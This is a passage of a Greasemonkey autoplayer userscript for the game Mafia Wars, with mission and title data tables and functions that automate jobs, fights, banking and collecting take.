    ['Battle Your Way Through The Temple'                , 96,144,8,BANGKOK,159,0,'     '], // FINALE
    ['Overthrow The Shadow King'                         ,  1,145,8,BANGKOK,  3,0,'     '], // BOSS JOB
///////////////////////////////////////////////////////////////////////////////////////////// DONT forget the comma above
//     60 jobs, 6 boss, 11 fight, 6 social, 37 energy
//      7                                                   5   4 2   1       6 3   0                PATH
    ['Move Your Crew Into A Safe House'                  ,  9,  1,1,LV    ,  7,0,'node1' ],    // ENERGY DISTRICT 1  LAS VEGAS NORTH LAS VEGAS
    ['Blackmail A Car Dealer'                            ,  8,  2,1,LV    , 11,0,'node2' ],    // ENERGY
    ['Steal A Truckload Of Slots'                        , 24,  3,1,LV    , 18,0,'node3' ],    // ENERGY
    ['Secure Some Wheels'                                , 18,  4,1,LV    , 25,0,'node4' ],    // ENERGY
    ['Roll a Bingo Parlor'                               ,  6,  5,1,LV    ,  9,1,'node5' ],    //  FIGHT
    ['Break Into A Gun Shop'                             , 12,  6,1,LV    , 16,0,'node6' ],    // ENERGY
    ['Scout Out Alphabet City'                           , 15,  7,1,LV    , 20,0,'node7' ],    // ENERGY
    ['Open Fire On Victor&amp;\'s Crew'                  , 23,  8,1,LV    , 27,0,'node8' ],    //SOCIAL
//   ['Boss: Defeat Victor Lil\' Loco Alves'             ,  5,  9,1,LV    ,  6,0,'node9' ],    //        BOSS JOB STAMINA
    ['Help A Bookie Out Of A Jam'                        , 15, 10,2,LV    ,  9,0,'node10'],    // ENERGY DISTRICT 2  LAS VEGAS PARADISE CITY
    ['Win An Underground Fight'                          , 11, 11,2,LV    , 18,1,'node11'],    //  FIGHT
    ['Clip A Petty Thug'                                 , 10, 12,2,LV    , 16,1,'node12'],    //  FIGHT
    ['Fix A Boxing Match'                                , 11, 13,2,LV    , 15,0,'node13'],    // ENERGY
    ['Clean Up At A Rigged Table'                        , 10, 14,2,LV    , 14,0,'node14'],    // ENERGY
    ['Recruit A Table Game Dealer'                       ,  9, 15,2,LV    , 12,0,'node15'],    // ENERGY (PROPERTY)
    ['Strong-Arm A Limo Company'                         , 14, 16,2,LV    , 18,0,'node16'],    // ENERGY
    ['Shut Down An Uncooperative Club'                   , 15, 17,2,LV    , 20,0,'node17'],    // ENERGY
    ['Hit Up A Nightclub'                                ,  7, 18,2,LV    ,  9,0,'node18'],    // ENERGY
//  ['Boss: Defeat Jimmy \'Big Time\' Mancuso'           ,  5, 19,2,LV    , 70,0,'node19'],    //        BOSS JOB STAMINA
    ['Open Fire On A Rival Outfit'                       , 14, 20,3,LV    , 23,1,'node20'],    //  FIGHT  DISTRICT 3  LAS VEGAS THE LOWER STRIP
    ['Buy Some Black-Market Info'                        ,  9, 21,3,LV    , 15,0,'node21'],    // ENERGY
    ['Steal An SUV'                                      , 12, 22,3,LV    , 19,2,'node22'],    //SOCIAL
    ['Run A Visiting Gang Boss Out'                      , 17, 23,3,LV    , 28,1,'node23'],    //  FIGHT
    ['Do Some Late Night Shopping'                       , 10, 24,3,LV    , 17,0,'node24'],    // ENERGY
    ['Rob A Gem Broker'                                  , 23, 25,3,LV    , 36,2,'node25'],    //SOCIAL
    ['Convince A Restaurateur To Leave Town'             , 17, 26,3,LV    , 24,0,'node26'],    // ENERGY (PROPERTY)
    ['Arrange A Hardware Delivery'                       , 15, 27,3,LV    , 23,0,'node27'],    // ENERGY
    ['Break Into A Luxury Suite'                         , 17, 28,3,LV    , 26,0,'node28'],    // ENERGY
//  ['Boss: Defeat Juliana \"Black Widow\" Trieste'      ,  6, 29,3,LV    ,200,0,'node29'],    //        BOSS JOB STAMINA
    ['Bribe A Casino Pit Boss'                           ,  5, 30,4,LV    ,  8,0,'node30'],    // ENERGY DISTRICT 4  LAS VEGAS SHOGUN CASINO
    ['Steal A Valet\'s Uniform'                          , 12, 31,4,LV    , 20,0,'node31'],    // ENERGY
    ['Swipe A Security Keycard'                          , 10, 32,4,LV    , 16,0,'node32'],    // ENERGY
    ['Take Out An Armed Casino Guard'                    , 13, 33,4,LV    , 21,1,'node33'],    //  fight
    ['Create A Distraction On The Floor'                 , 10, 34,4,LV    , 17,0,'node34'],    // ENERGY
    ['Hack The Casino Security System'                   , 12, 35,4,LV    , 21,0,'node35'],    // ENERGY
    ['Break Into The Vault'                              , 17, 36,4,LV    , 26,0,'node36'],    // ENERGY
    ['Get To An Exit'                                    , 22, 37,4,LV    , 35,0,'node37'],    // ENERGY
    ['Hijack A Poker Table Delivery'                     , 18, 38,4,LV    , 27,0,'node38'],    // ENERGY (PROPERTY)
//  ['Boss: Defeat Roger Bidwell\, Chief of Security'    ,  6, 39,4,LV    ,400,0,'node39'],    //        BOSS JOB STAMINA
    ['Move The Take Out Of Town'                         , 13, 40,5,LV    , 21,0,'node40'],    // ENERGY DISTRICT 5 LAS VEGAS MOJAVE DESERT
    ['Fight Off A Hijack Crew'                           , 14, 41,5,LV    , 23,1,'node41'],    //  FIGHT
    ['Run A Highway Patrol Blockade'                     , 23, 42,5,LV    , 37,2,'node42'],    //SOCIAL
    ['Buy Off A Crooked Border Agent'                    , 15, 43,5,LV    , 24,0,'node43'],    // ENERGY
    ['Stash The Take'                                    , 20, 44,5,LV    , 33,2,'node44'],    //social
    ['Arrange A Cartel Sale'                             ,  9, 45,5,LV    , 16,0,'node45'],    // ENERGY
    ['Clean Out A Biker Bar'                             , 11, 46,5,LV    , 19,1,'node46'],    //  FIGHT
    ['Create A Diversion'                                , 11, 47,5,LV    , 18,0,'node47'],    // ENERGY
    ['Dispose Of The Evidence'                           , 14, 48,5,LV    , 23,0,'node48'],    // ENERGY
//  ['Boss: Defeat \'Red\' Jackson'                      ,  7, 49,5,LV    ,600,0,'node49'],    //        BOSS JOB STAMINA
    ['Rescue A Hotelier'                                 , 10, 50,5,LV    , 17,0,'node50'],    // ENERGY PATH (PROPERTY)
    ['Remove An Unhelpful Union Rep'                     , 15, 51,6,LV    , 26,1,'node51'],    //  fight PATH
    ['Get A Council Member On Board'                     , 17, 52,6,LV    , 27,0,'node52'],    // ENERGY PATH
    ['Buy Off A Precinct Captain'                        , 18, 53,6,LV    , 29,0,'node53'],    // ENERGY PATH
    ['Eliminate A Hill Supplier'                         , 16, 54,6,LV    , 28,1,'node54'],    //  fight PATH
    ['Convince A Judge To Step Down'                     , 14, 55,6,LV    , 29,0,'node55'],    // ENERGY PATH
    ['Wipe Out The Hill Security Detail'                 , 18, 56,6,LV    , 32,1,'node56'],    //  fight PATH
    ['Remove The Hill\'s Support Base'                   , 17, 57,6,LV    , 27,2,'node57'],    //social  PATH
    ['Reveal A Politician\'s Dirty Secret'               , 19, 58,6,LV    , 30,0,'node58'],    // ENERGY PATH
    ['Infiltrate The Hill Resort'                        , 16, 59,6,LV    , 25,0,'node59'],    // ENERGY PATH
//  ['Boss: Defeat Leon and Marcus Hill'                 ,  7, 60,6,LV    ,900,0,'node60'],    //        boss job
    ['Breach the Area 51 Perimeter'                      , 15, 61,7,LV    , 25,0,'node61'],    // ENERGY PATH
    ['Neutralize a Security Patrol'                      , 14, 62,7,LV    , 24,1,'node62'],    // Stamina PATH
    ['Disable a Surveillance Station'                    , 21, 63,7,LV    , 33,0,'node63'],    // ENERGY PATH
    ['Infiltrate A Top Secret Bunker'                    , 18, 64,7,LV    , 32,0,'node64'],    // ENERGY PATH
    ['Attack A Guard Post'                               , 16, 65,7,LV    , 27,1,'node65'],    // Stamina PATH
    ['Find A Route Through The Ducts'                    , 23, 66,7,LV    , 36,0,'node66'],    // ENERGY PATH
    ['Take Out A Black Ops Team'                         , 18, 67,7,LV    , 32,1,'node67'],    // Stamina PATH
    ['Nab A High Tech Prototype'                         , 19, 68,7,LV    , 33,0,'node68'],    // ENERGY PATH
    ['Hack The Research Lab Door'                        , 18, 69,7,LV    , 29,0,'node69'],    // ENERGY PATH
//  ['Boss: Defeat Dr. Hank Williams'                    ,  8, 70,7,LV    ,120,0,'node70'],    //           Boss Job
    ['Uncover Rumors About Governor Halloran'            , 17, 71,8,LV    , 28,0,'node71'],    // ENERGY PATH
    ['Question Some Meth Heads'                          , 15, 72,8,LV    , 26,1,'node72'],    // Stamina PATH
    ['Dig Up Links To Halloran And A Meth Ring'          , 20, 73,8,LV    , 35,0,'node73'],    // ENERGY PATH
    ['Discover A Big Meth Buy At The Hoover Dam'         , 24, 74,8,LV    , 37,0,'node74'],    // Social PATH
    ['Get Your Spotters In Place Above The Dam'          , 22, 75,8,LV    , 38,0,'node75'],    // ENERGY PATH
    ['Take Out A Crooked DEA Unit'                       , 17, 76,8,LV    , 29,1,'node76'],    // Stamina PATH
    ['Verify Halloran\'s Arrival At The Dam'             , 19, 77,8,LV    , 34,0,'node77'],    // ENERGY PATH
    ['Take Down The Security Detail'                     , 20, 78,8,LV    , 35,1,'node78']     // Stamina PATH
//  ['Boss: Defeat Governor Halloran'                    ,  8, 79,8,LV    ,120,0,'node79']     //           Boss Job

// job description0, energy cost1, job number2, tab number3, city4, exp payout5, tabpath6, lvnode7, ratio8



///////////////////////////////////////////////////////////////////////////////////////////
  );

  var missionTabs = new Array(
    // NEW YORK
    ['Street Thug (Levels 1-4)','Associate (Levels 5-8)','Soldier (Levels 9-12)',
     'Enforcer (Levels 13-17)','Hitman (Levels 18-24)', 'Capo (Levels 25-34)',
     'Consigliere (Levels 35-59)','Underboss (Levels 60-99)','Boss (Levels 100+)'],
    // CUBA
    ['El Soldado (Levels 35-59)','El Capitan (Levels 60-84)','El Jefe (Levels 85-109)',
     'El Patron (Levels 110-129)','El Padrino (Levels 130-150)','El Cacique (Levels 151+)'],
    // MOSCOW
    ['Baklany','Boets','Brigadir','Avtoritet','Vor','Pakhan'],
    // BANGKOK
    ['Brawler','Criminal','Pirate','Commandant','Oyabun','Dragon Head','Saboteur','Assassin'],
    // LAS VEGAS ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ['North Las Vegas','Paradise City','The Lower Strip','Shogun Casino','Mojave Desert','The Upper Strip','Area 51','Hoover Dam']
  );

  var mwTitles = new Array(
    'Street Thug', 'Skilled Street Thug', 'Master Street Thug', 'Associate', 'Skilled Associate', 'Master Associate', 'Soldier', 'Skilled Soldier', 'Master Soldier',
    'Enforcer', 'Skilled Enforcer', 'Master Enforcer', 'Hitman', 'Skilled Hitman', 'Master Hitman', 'Capo', 'Skilled Capo', 'Master Capo',
    'Consigliere', 'Skilled Consigliere', 'Master Consigliere', 'Underboss', 'Skilled Underboss', 'Master Underboss', 'Boss', 'Skilled Boss', 'Master Boss',
    'El Soldado', 'El Soldado Experto', 'El Soldado Principal', 'El Capitan', 'El Capitan Experto', 'El Capitan Principal', 'El Jefe', 'El Jefe Experto', 'El Jefe Principal',
    'El Patron', 'El Patron Experto', 'El Patron Principal', 'El Padrino', 'El Padrino Experto', 'El Padrino Principal', 'El Cacique', 'El Cacique Experto', 'El Cacique Principal',
    'Baklan', 'Umelyj Baklan', 'Matyoryj Baklan', 'Boets', 'Umelyj Boets', 'Matyoryj Boets', 'Brigadir', 'Umelyj Brigadir', 'Matyoryj Brigadir',
    'Avtoritet', 'Umelyj Avtoritet', 'Matyoryj Avtoritet', 'Vor', 'Umelyj Vor', 'Matyoryj Vor', 'Pakhan', 'Umelyj Pakhan', 'Matyoryj Pakhan',
    'Brawler', 'Apprentice Brawler', 'Skilled Brawler', 'Master Brawler', 'Criminal', 'Apprentice Criminal', 'Skilled Criminal', 'Master Criminal',
    'Pirate', 'Apprentice Pirate', 'Skilled Pirate', 'Master Pirate', 'Commandant', 'Apprentice Commandant', 'Skilled Commandant', 'Master Commandant',
    'Oyabun', 'Apprentice Oyabun', 'Skilled Oyabun', 'Master Oyabun', 'Dragon Head', 'Apprentice Dragon Head', 'Skilled Dragon Head', 'Master Dragon Head',
    'Burglar','Apprentice Burglar', 'Skilled Burglar', 'Master Burglar', 'Saboteur', 'Apprentice Saboteur', 'Skilled Saboteur', 'Master Saboteur',
    'Touristy Bandito', 'Local Bandito', 'Professional Bandito', 'Big Time Bandito', 'Touristy Hustler', 'Local Hustler', 'Professional Hustler', 'Big Time Hustler',
    'Touristy Cowboy', 'Local Cowboy', 'Professional Cowboy', 'Big Time Cowboy', 'Touristy Maverick', 'Local Maverick', 'Professional Maverick', 'Big Time Maverick',
    'Touristy Desert Rat', 'Local Desert Rat', 'Professional Desert Rat', 'Big Time Desert Rat',
    'Apprentice Bully', 'Skilled Bully', 'Master Bully','Apprentice Brute', 'Skilled Brute', 'Master Brute','Apprentice Hunter', 'Skilled Hunter', 'Master Hunter',
    'Apprentice Slayer', 'Skilled Slayer', 'Master Slayer','Apprentice Killer', 'Skilled Killer', 'Master Killer','Apprentice Executioner', 'Skilled Executioner', 'Master Executioner',
    'Apprentice Assassin', 'Skilled Assassin', 'Master Assassin',
    'Apprentice Burglar', 'Burglar', 'Master Burglar', 'Apprentice Robber', 'Robber', 'Master Robber', 'Apprentice Thief', 'Thief', 'Master Thief', 'Grand Master Thief',
    'Trainee', 'Sparring Partner', 'Novice', 'Journeyman', 'Fighter', 'Boxer', 'Contender', 'Finalist', 'Champion', 'World Champion'
  );

  const CHOICE_JOBNO   = 0;
  const CHOICE_JOBNAME = 1;
  const CHOICE_CITY    = 2;

  var choiceJobs = new Array (
    // Job no and Job names array must correspond with each city's CITY_SIDES array
    // MOSCOW
    [[4,7], ['Kidnap A Local Gang Leader for the Vory', 'Kill A Local Gang Leader for the Mafiya'], MOSCOW],
    [[5, 8], ['Collect The Ransom', 'Collect the Hit Payoff'], MOSCOW],
    [[6, 9], ['Receive Vory Intel On Dmitri', 'Buy Mafiya Intel On Dmitri'], MOSCOW],
    [[17, 20], ['Fix A Local Election for the Vory', 'Abduct A Candidate\'s Wife For the Mafiya'], MOSCOW],
    [[18, 21], ['Extract A Favor From The Winner', '"Convince" The Candidate To Withdraw'], MOSCOW],
    [[19, 22], ['Catch Karpov Accepting A Bribe', 'Kill An Investigative Reporter'], MOSCOW],
    [[34, 37], ['Take A Guard Hostage During Your Escape', 'Execute A Bank Guard During Your Escape'], MOSCOW],
    [[35, 38], ['Use The Guard\'s Keys To Access the Bank Armory', 'Steal The Bank President\'s Car Keys'], MOSCOW],
    [[36, 39], ['"Borrow" The Guard\'s Uniform After Releasing Him', 'Strip A Uniform Off The Corpse'], MOSCOW],
    [[47, 50], ['Fly To The Siberian Military District', 'Travel To The Volga Military District'], MOSCOW],
 //FIXME - Can the jobs be entered in the array as with 3 options, In case the job name change hasn't rolled out to all servers?
 //OLD   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
 //NEW   [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium'], MOSCOW],
    [[48, 51], ['Rob A Troop Convoy', 'Arrange The Sale Of Weapons-Grade Uranium', 'Arrange The Sale Of Weapons-Grade Explosives'], MOSCOW],
    [[49, 52], ['Intercept The Base\'s Pay Shipment', 'Capitalize On An Officer\'s Gambling Problem'], MOSCOW],
    [[64, 67], ['Infiltrate The ULF Cell', 'Discover The Location Of The Next ULF Attack'], MOSCOW],
    [[65, 68], ['Help "Plan" The Next Attack', 'Kill A Lookout'], MOSCOW],
    [[66, 69], ['Sabotage The Plan From The Inside', 'Stop The ULF Attack'], MOSCOW],
    [[77, 80], ['Attack A Mafiya Business', 'Burn Down A Vory Safehouse'], MOSCOW],
    [[78, 81], ['Hijack A Mafiya Cargo', 'Hit A Vory Nightclub'], MOSCOW],
    [[79, 82], ['Threaten A Mafiya Moneyman\'s Family', 'Break Into An Architect\'s Office'], MOSCOW],
    // BANGKOK
    [[5, 8], ['Meet A Gang\'s Rep In A Go-Go Bar', 'Meet A Gang\'s Rep In A Go-Go Bar'], BANGKOK],
    [[11, 14], ['Intercept An Ammo Shipment', 'Intercept An Ammo Shipment'], BANGKOK],
    [[24, 27], ['Set Up A Phony Business', 'Set Up A Phony Business'], BANGKOK],
    [[30, 33], ['Pay Off The Guards At Bangkwang Prison', 'Pay Off The Guards At Bangkwang Prison'], BANGKOK],
    [[43, 46], ['Hijack A Boat Load Of Electronics', 'Hijack A Boat Load Of Electronics'], BANGKOK],
    [[49, 52], ['Steal Shipping Manifests', 'Steal Shipping Manifests'], BANGKOK],
    [[62, 65], ['Establish Contact With A CIA Agent', 'Establish Contact With A CIA Agent'], BANGKOK],
    [[68, 71], ['Betray Commander Chang and the UWSA', 'Betray Commander Chang and the UWSA'], BANGKOK],
    [[81, 84], ['Meet With Boss Matsumura\'s Advisor', 'Meet With Boss Matsumura\'s Advisor'], BANGKOK],
    [[87, 90], ['Talk With A Police Insider About Matsumura', 'Talk With A Police Insider About Matsumura'], BANGKOK],
    [[100, 103], ['Intimidate Wealthy Expatriates', 'Intimidate Wealthy Foreign Expatriates'], BANGKOK],
    [[106, 109], ['Talk With Wei\'s Disloyal Enforcers', 'Talk With Wei\'s Disloyal Enforcers'], BANGKOK],
    [[119, 122], ['Get A Gang Member Back Into Thailand', 'Get A Gang Member Back Into Thailand'], BANGKOK],
    [[125, 128], ['Undermine Nongchai\'s Support', 'Undermine Nongchai\'s Support'], BANGKOK]
  );

  var requirementJob = new Array(
    // Item, Job, City
    ['Liquor', 'Distill Some Liquor',NY],
    ['Tokens', 'Manufacture Tokens',NY],
    ['Wiretap Device', 'Overtake Phone Central',NY],
    ['1 Wiretap Device', 'Overtake Phone Central',NY],
    ['Cards', 'Get Cheating Deck',NY],
    ['Untraceable Cell Phone', 'Rob an Electronics Store',NY],
    ['Concealable Camera', 'Rob an Electronics Store',NY],
    ['Computer Set-Up', 'Rob an Electronics Store',NY],
    ['Blackmail Photos', 'Obtain Compromising Photos',NY],
    ['Illegal Transaction Records', 'Steal Bank Records',NY],
    ['.22 Pistol', 'Beat Up Rival Gangster',NY],
    ['Revolver', 'Beat Up Rival Gangster',NY],
    ['9mm Semi-Automatic', 'Rob a Pimp',NY],
    ['Butterfly Knife', 'Collect Protection Money',NY],
    ['Brass Knuckles', 'Rough Up Dealers',NY],
    ['Tactical Shotgun', 'Perform a Hit',NY],
    ['.45 Revolver', 'Take Out a Rogue Cop',NY],
    ['C4', 'Destroy Enemy Mob Hideout',NY],
    ['Stab-Proof Vest', 'Kill a Protected Snitch',NY],
    ['Automatic Rifle', 'Bust a Made Man Out of Prison',NY],
    ['Lucky Shamrock Medallion', 'Clip the Irish Mob\'s Local Enforcer',NY],
    ['Semi-Automatic Shotgun', 'Fight a Haitian Gang',NY],
    ['Firebomb', 'Steal a Tanker Truck',NY],
    ['Armored Truck', 'Smuggle Thai Gems',NY],
    ['Grenade Launcher', 'Repel the Yakuza',NY],
    ['.50 Caliber Rifle', 'Disrupt Rival Smuggling Ring',NY],
    ['Armored Car', 'Invade Tong-controlled Neighborhood',NY],
    ['RPG Launcher', 'Sell Guns to the Russian Mob',NY],
    ['Bodyguards', 'Protect your City against a Rival Family',NY],
    ['Night Vision Goggles', 'Assassinate a Political Figure',NY],
    ['Napalm', 'Exterminate a Rival Family',NY],
    ['Prop plane', 'Steal an Air Freight Delivery',NY],
    ['Chopper', 'Run a Biker Gang Out of Town',NY],
    ['Luxury Yacht', 'Influence a Harbor Official',NY],
    ['GX9', 'Ransom a Businessman\'s Kids',NY],
    ['Bookie\'s Holdout Pistol', 'Fix the Big Game',NY],
    ['Multi-Purpose Truck', 'Break Into the Armory',NY],
    ['BA-12 Assault Rifle', 'Rip Off the Armenian Mob',NY],
    ['Falsified Documents', 'Take Over an Identity Theft Ring',NY],
    ['Federal Agent', 'Buy Off a Federal Agent',NY],
    ['Private Jet', 'Make a Deal with the Mexican Cartel',NY],
    ['Police Cruiser', 'Blackmail the District Attorney',NY],
    ['Armoured Limousine', 'Shake Down a City Council Member',NY],
    ['Cigarette Boat', 'Take Over The Docks',CUBA],
    ['TNT', 'Raid The Arms Depot',CUBA],
    ['Si-14 Cargo Plane', 'Capture The Airport',CUBA],
    ['Armored State Car', 'Storm The Presidential Palace',CUBA],
    ['Untraceable Cell Phone', 'Arrange A Drug Shipment for the Mafiya',MOSCOW],
    ['Concealable Camera', 'Smuggle Consumer Electronics for the Vory',MOSCOW],
    ['Dossier on Dmitri', 'Receive Vory Intel On Dmitri',MOSCOW],
    ['Dossier on Dmitri', 'Buy Mafiya Intel On Dmitri',MOSCOW],
    ['Ballistic Knife', 'Silence A Political Critic',MOSCOW],
    ['Severnyy Olen Snowbike', 'Extract A Favor From The Winner',MOSCOW],
    ['Set of Photos of Karpov', 'Kill An Investigative Reporter',MOSCOW],
    ['Set of Photos of Karpov', 'Catch Karpov Accepting A Bribe',MOSCOW],
    ['RAS-15', '"Convince" The Candidate To Withdraw',MOSCOW],
    ['Officer Corps Paycheck', 'Capitalize On An Officer\'s Gambling Problem',MOSCOW],
    ['Officer Corps Paycheck', 'Intercept The Base\'s Pay Shipment',MOSCOW],
    ['Bank Guard Uniform', 'Strip A Uniform Off The Corpse',MOSCOW],
    ['Bank Guard Uniform', '"Borrow" The Guard\'s Uniform After Releasing Him',MOSCOW],
    ['Stick of Dynamite', 'Sabotage The Plan From The Inside',MOSCOW],
    ['Stick of Dynamite','Stop The ULF Attack',MOSCOW],
    ['Mansion Details','Break Into An Architect\'s Office',MOSCOW],
    ['Mansion Details','Threaten A Mafiya Moneyman\'s Family',MOSCOW],
    ['Satellite Phone','Hijack A Boat Load Of Electronics',BANGKOK],
    ['Car Key Copy','Blackmail A Car Dealer',LV],
    ['Hot Tip','Help A Bookie Out Of A Jam ',LV],
    ['Alarm Code','Buy Some Black-Market Info',LV],
    ['Hotel Security Key Card','Swipe A Security Keycard',LV],
    ['Unwanted Evidence','Create A Diversion',LV]
  );

  // Sort requirement jobs by level requirement, ascending
  requirementJob.sort(function(a, b) { return cities[a[2]][CITY_LEVEL] - cities[b[2]][CITY_LEVEL]; });

  // Business items
  var bizJobItems = new Array(
    ['Politico Corrupto', CUBA],
    ['Pirate', BANGKOK],
    ['Drug Shipment', BANGKOK]
  );

  String.prototype.trim = function() {
    return this.replace(/^\s+|\s+$/g, '');
  };
  String.prototype.ltrim = function() {
    return this.replace(/^\s+/, '');
  };
  String.prototype.rtrim = function() {
    return this.replace(/\s+$/, '');
  };
  String.prototype.untag = function() {
    return this.replace(/<[^>]*>/g, '');
  };
  String.prototype.clean = function() {
    return this.replace(/<\/?[^>]+(>|$)/g, '');
  };

  Array.prototype.searchArray = function(target, index) {
    // To use this method, "this" must be an array of arrays. Each array
    // contained in "this" has one of its elements (specified by the
    // "index" parameter) compared against the target parameter. An array
    // is returned that contains the indices of "this" in which a match
    // was found.
    //
    // NOTE: "target" can be a regular expression. If the array element
    //       is a string, it is compared for a pattern match.
    var returnArray = [];
    var checkArray = function (exp, item) {
      if (typeof(exp) == 'function' &&
          typeof(item) == 'string') {
        // Assume target is a regex to be matched against the string.
        if (target.test(item)) {
          return true;
        }
      } else if (item === exp) {
        return true;
      // Case insensitive checking
      } else if (typeof(exp) == 'string' && item.toLowerCase() == exp.toLowerCase()) {
        return true;
      }
      return false;
    };

    for (var i = 0, iLength = this.length; i<iLength; ++i) {
      if (typeof(this[i][index]) == 'object') {
        for (var j = 0, jLength = this[i][index].length; j < jLength; ++j) {
          if (checkArray(target, this[i][index][j])) {
            returnArray.push(i);
            break;
          }
        }
      } else if (checkArray(target, this[i][index])) {
        returnArray.push(i);
      }
    }
    return returnArray.length? returnArray : false;
  };

  // Array.unique() - Remove duplicate values
  Array.prototype.unique = function() {
    var a = [];
    var l = this.length;
    for (var i=0; i < l; ++i) {
      for (var j = i + 1; j < l; ++j) {
        // If this[i] is found later in the array
        if (this[i] === this[j])
          j = ++i;
      }
      a.push(this[i]);
    }
    return a;
  };

  // Check for missing settings.
  if (isGMUndefined('autoClick')) {
    saveDefaultSettings();
    addToLog('info Icon', 'If you want to perform jobs, fighting, and other actions automatically, please adjust your settings.');
  }

  // Check for a version change.
  if (GM_getValue('version') != SCRIPT.version) {
    GM_setValue('newversion', SCRIPT.version);
    sendMWValues(['version','newversion']);
    grabUpdateInfo();
    handleVersionChange();
  }

  // Load the missions array from previously saved value
  if (!isGMUndefined('missions')) {
    var savedMissions = eval ('(' + GM_getValue('missions') + ')');
    if (savedMissions.length == missions.length) {
      missions = savedMissions;
      DEBUG('Using saved missions array.');
    } else {
      DEBUG('Missions array updated.');
    }
  }

  // Set the initial run state.
  if (typeof GM_getValue('isRunning') != 'boolean') {
    alert('PS MWAP: Inconsistent state found in settings, please check them!');
    GM_setValue('isRunning', false);
  }
  running = GM_getValue('isRunning');

  var Reload = new Animate();
  Reload.desc = 'reload';
  var Autoplay = new Animate();
  Autoplay.desc = 'auto-play';
  Autoplay.fx = loadHome;

  // get saved attack/defense stats
  curAttack = GM_getValue('curAttack', undefined);
  curDefense = GM_getValue('curDefense', undefined);
  curAttackEquip = GM_getValue('curAttackEquip', undefined);
  curDefenseEquip = GM_getValue('curDefenseEquip', undefined);

  // Get player lists.
  var fightListInactive = new PlayerList('fightListInactive');
  var fightListActive   = new PlayerList('fightListActive');
  var fightListNew      = new PlayerList('fightListNew');
  var fightListAvoid    = new PlayerList('fightListAvoid');
  var giftList          = new PlayerList('giftList');

  // Choose sides (handling)
  chooseSides();

  // If the user has chosen to reset timers on startup
  if (isGMChecked('autoResetTimers')) {
    resetTimers(0);
  }

  // This line is optional, but it makes the menu display faster.
  refreshMWAPCSS();
  customizeMasthead();
  customizeLayout();

  // Add event listeners.
  setListenContent(true);

  // Make sure the modification timer goes off at least once.
  setModificationTimer();
  managePopups();

  var initialized = true;
  DEBUG('Completed initialize.');

  // For chrome
  sendSettings();
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
  DEBUG('There are ' + missions.length + ' known missions.');
  //for (var i =0; i < missions.length ; i++) DEBUG('M' + i + ': ' + missions[i]);
}

// Copy settings from background storage
function synchSettings() {
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
}

// Send settings to background storage
function sendSettings() {
  sendMWValues(['isRunning', 'autoGiftSkipOpt', 'autoLottoOpt', 'autoSecretStash',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

function Animate() {
  this.TOUT = null;
  this.desc = '';
  this.fx = null;
  this.delay = null;
}

Animate.prototype.clearTimeout = function() {
  if (this.TOUT) {
    DEBUG('Clearing ' + this.desc + ' timer ' + this.TOUT + '.');
    clearTimeout(this.TOUT);
    this.TOUT = null;
  }
};

Animate.prototype.setTimeout = function(fx, delay) {
  this.clearTimeout();
  this.fx = fx;
  this.delay = delay;
  // Make the handler clear TOUT. This prevents attempts
  // to clear timers that have already gone off.

  var obj = this;
  this.TOUT = window.setTimeout(function () { if (obj) obj.TOUT = null; fx(); }, delay);
  DEBUG('Started ' + this.desc + ' timer ' + this.TOUT +
        ', delay=' + delay/1000 + ' sec.');
};

Animate.prototype.start = function() {
  if (running && settingsOpen === false && this.fx) {
    this.setTimeout(this.fx, this.delay);
  } else if (settingsOpen === true) {
    DEBUG('Settings box open. Not starting ' + this.desc + ' timer.');
  } else {
    DEBUG('Autoplayer paused. Not starting ' + this.desc + ' timer.');
  }
};

// Set up auto-reload (if enabled).
if (initialized) {
  autoReload();

  if (!refreshGlobalStats()) {
    // Stop the script. (The timer will still go off and reload.)
    handleUnexpectedPage();
  } else {

    refreshSettings();

    if (GM_getValue('logOpen') == 'open') {
      showMafiaLogBox();
    }
  }
}

///////////////////////////////////////////////////////////////////////////////
//   End of top-level code. Automatic play is kicked off by doAutoPlay().    //
///////////////////////////////////////////////////////////////////////////////

function doAutoPlay () {
  var hasHome = level >= 6;
  var hasFight = level >= 5;
  var hasProps = level >= 4;
  var hasMarket = level >= 7;
  // Set the default auto-play timer function and delay.
  Autoplay.fx = goHome;
  Autoplay.delay = getAutoPlayDelay();

  var previouslyIdle = idle;
  idle = false;

  // Determine whether a job and/or fight/hit could be attempted.
  var autoMissionif = running && !skipJobs && canMission();
  var autoStaminaSpendif = running && !skipStaminaSpend && canSpendStamina() && hasFight;
  var energyMaxed = (autoMissionif && energy >= maxEnergy);
  var staminaMaxed = (autoStaminaSpendif && stamina >= maxStamina);
  var maxed = energyMaxed || staminaMaxed;

  // Check if energy / stamina burning is prioritized
  if (isGMChecked('burnFirst')) {
    var spendFirst = GM_getValue('burnOption');

    // Prioritize using energy
    if (stamina < maxStamina && running && canMission() && spendFirst == BURN_ENERGY) {
      autoMissionif = true;
      autoStaminaSpendif = false;
    }

    // Prioritize using stamina
    if (energy < maxEnergy && running && canSpendStamina() && hasFight && spendFirst == BURN_STAMINA) {
      autoMissionif = false;
      autoStaminaSpendif = true;
    }
  }

  // Click attack if on warNav
  if (running && onWarTab() && (isGMChecked('autoWar') || helpWar )) {
    if (autoWarAttack()) return;
  }

  // Auto-bank
  var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank &&
                cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));
  if (running && canBank) {
    if (autoBankDeposit(city, cities[city][CITY_CASH])) return;
  }


  // Auto-collect take (limit to level 4 and above)
  if (running && !maxed && hasProps) {
    for (var i = 0, iLength = cities.length; i < iLength; ++i) {
      if (level >= cities[i][CITY_LEVEL] &&
          isGMChecked('collectTake' + cities[i][CITY_NAME]) &&
          !timeLeftGM('takeHour' + cities[i][CITY_NAME])) {

        // Collect take
        if (autoCollectTake(i)) return;
      }
    }
  }
	// Collect Take first then try to build
  // Build Cars
  if (running && !maxed && isGMChecked('buildCar') && !timeLeftGM('buildCarTimer')) {
    if (buildItem(cityCars, GM_getValue('buildCarId',1), 11)) return;
  }
  // Build Weapons
